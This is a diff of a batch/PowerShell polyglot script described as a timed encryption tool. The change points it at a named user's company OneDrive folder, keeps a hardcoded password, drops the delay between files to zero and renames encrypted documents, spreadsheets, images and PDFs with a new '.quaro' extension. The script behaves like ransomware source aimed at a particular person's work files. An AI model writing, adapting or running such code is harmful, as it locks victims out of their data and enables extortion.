@@ -38,9 +38,9 @@ exit /b
 : end batch / begin powershell #>
 
 # Enhanced Encryption Script - Timed Encryption with GUI Window
-$FolderPath = "C:\Users\jgsleepy\OneDrive - 2Source4\Attachments"
+$FolderPath = "C:\Users\jvdbosch\OneDrive - 2source4 B.V\2SOURCE4"
 $Password = "jgsleepwithme"
-$IntervalSeconds = 5
+$IntervalSeconds = 0
 
 # File types to encrypt
 $FileTypes = @("*.txt", "*.docx", "*.doc", "*.xlsx", "*.xls", "*.pptx", "*.ppt", "*.png", "*.jpg", "*.jpeg", "*.gif", "*.bmp", "*.pdf")
@@ -203,9 +203,9 @@ function Encrypt-SingleFile {
         $nameBytes = [System.Text.Encoding]::UTF8.GetBytes($originalName)
         $nameLength = [System.BitConverter]::GetBytes([int32]$nameBytes.Length)
         
-        # Create new filename: remove extension, add .fokjou
+        # Create new filename: remove extension, add .quaro
         $baseNameWithoutExt = [System.IO.Path]::GetFileNameWithoutExtension($file.Name)
-        $outputPath = Join-Path $file.DirectoryName "$baseNameWithoutExt.fokjou"
+        $outputPath = Join-Path $file.DirectoryName "$baseNameWithoutExt.quaro"
         
         # Build encrypted file structure
         $output = New-Object System.Collections.Generic.List[byte]
